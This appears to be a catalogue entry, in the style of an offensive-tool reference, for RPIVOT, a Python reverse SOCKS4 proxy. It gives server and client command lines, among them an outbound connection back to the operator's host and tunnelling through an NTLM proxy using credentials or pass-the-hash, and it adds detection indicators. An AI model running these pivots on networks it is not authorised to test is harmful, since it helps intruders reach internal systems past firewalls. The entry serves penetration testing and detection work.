---
Name: RPIVOT
Description: RPIVOT is a reverse SOCKS4 proxy for penetration testing, written in Python with no third-party dependencies. It works like SSH dynamic port forwarding but in the opposite direction, with the server listening on the operator's host while the client is run on the target network and connects out to it, which lets the operator reach the target's internal network even through an outbound-only firewall. It also supports pivoting through an NTLM proxy, including pass-the-hash.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: python server.py --server-port <PORT> --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
    Description: Starts the server on the operator's host, exposing a local SOCKS4 proxy once the client connects.
    Usecase: Operator side of a reverse SOCKS4 pivot.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: python client.py --server-ip <SERVER_IP> --server-port <PORT>
    Description: Connects the client on the target network back to the RPIVOT server, establishing the reverse proxy chain.
    Usecase: Pivoting into an internal network from a host that can only make outbound connections.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: python client.py --server-ip <SERVER_IP> --server-port <PORT> --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port <PROXY_PORT> --domain <DOMAIN> --username <USER> --password <PASSWORD>
    Description: Connects the client through an NTLM-authenticating outbound proxy (password or pass-the-hash) to reach the RPIVOT server.
    Usecase: Pivoting out through a corporate web proxy that requires NTLM authentication.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Full_Path:
  - Filename: server.py
  - Filename: client.py
  - Path: RPIVOT Python scripts (or a packaged rpivot.zip/PyInstaller build), executed anywhere on the system.
Detection:
  - Command: Execution of server.py or client.py (or a packaged equivalent) with --server-ip/--server-port/--proxy-port arguments.
  - Command: Outbound connections carrying SOCKS4 framing to an uncategorized host, particularly via an internal NTLM proxy to an external IP.
Resources:
  - Link: https://github.com/klsecservices/rpivot
---
